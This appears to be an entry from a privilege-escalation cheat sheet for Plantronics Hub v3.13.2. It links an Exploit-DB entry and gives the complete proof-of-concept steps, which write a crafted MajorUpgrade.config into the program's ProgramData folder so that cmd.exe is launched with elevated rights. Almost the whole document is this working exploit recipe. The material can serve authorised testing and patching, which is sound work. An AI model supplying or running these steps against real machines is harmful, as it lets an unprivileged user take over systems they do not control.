# plantronics hub

## v3.13.2 (Local Privesc)

```
https://www.exploit-db.com/exploits/47845

Steps for exploitation (PoC):
- Open cmd.exe 
- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
- echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.config
```
